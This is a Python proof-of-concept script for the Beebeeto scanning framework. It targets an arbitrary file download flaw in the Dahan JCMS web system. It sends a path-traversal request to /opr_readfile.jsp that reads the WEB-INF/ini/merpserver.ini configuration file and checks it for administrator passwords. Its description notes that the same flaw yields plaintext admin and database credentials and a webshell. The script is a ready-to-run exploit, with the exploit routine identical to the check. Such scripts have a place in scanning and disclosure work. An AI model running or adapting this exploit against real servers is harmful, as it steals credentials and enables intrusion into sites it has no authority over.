#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0106',
            'name': 'JCMS /opr_readfile.jsp 任意文件下载漏洞 POC',
            'author': '小马甲',
            'create_date': '2015-06-01',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'JCMS',
            'vul_version': ['*'],
            'type': 'Arbitrary File Download',
            'tag': ['JCMS漏洞', '/opr_readfile.jsp漏洞', 'jsp'],
            'desc': '''
                    大汉版通jcms系统任意文件读取，可以直接获取管理员账号，密码明文、数据库密码明文、
                    配置信息等非常敏感的信息，可以轻松实现无任何限制获取 WEBSHELL ...
                    ''',
            'references': ['http://www.ijindun.com/News/gonggao/2014/1125/178542.html'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        verify_url = ('%s/jcms/jcms_files/jcms1/web1/site/module/comment/opr_readfile.jsp?filename='
                      '../../../../../../WEB-INF/ini/merpserver.ini') % url
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and 'AdminPW' in req.content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())